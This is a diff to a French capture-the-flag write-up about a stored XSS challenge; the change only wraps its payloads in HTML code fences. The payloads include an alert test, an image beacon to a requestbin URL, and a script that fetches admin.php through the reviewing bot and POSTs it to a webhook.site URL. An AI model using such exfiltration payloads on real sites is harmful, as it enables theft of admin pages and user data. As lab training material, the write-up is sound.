@@ -6,20 +6,25 @@ On a aussi un formulaire de contact et des commentaires.
 On pense naturellement à une XSS
 On teste donc si la XSS est avérée:
 
+```html
 <script>alert(1);</script>
+```
 
 La page refresh au bout de 5 secondes, et bingo le script s'est exécuté.
 
 On regarde maintenant si un robot lit les messages que l'on envoie:
 
+```html
 <script>
     document.write('<img src="http://requestbin.net/r/yvnpmcyv"/>')
 </script>
+```
 
 On reçoit une requête du robot comme prévu:
 
 Nous allons maintenant récupérer la page admin.php grâce au robot.
 
+```html
 <script>
     //on récupère la page
     var xhr = new XMLHttpRequest();
@@ -32,6 +37,7 @@ Nous allons maintenant récupérer la page admin.php grâce au robot.
     xhr.open('POST', 'https://webhook.site/3c38f9b5-9979-485e-8999-ff4174c5b87f', false);
     xhr.send(page);
 </script>
+```
 
 Et on reçoit le flag sur webhook :)
 
